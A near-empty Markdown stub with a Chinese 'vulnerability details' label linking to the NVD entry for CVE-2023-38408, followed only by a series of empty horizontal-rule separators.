**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---



---



---



---



---



---



---



---



---



---



---



---



---



---

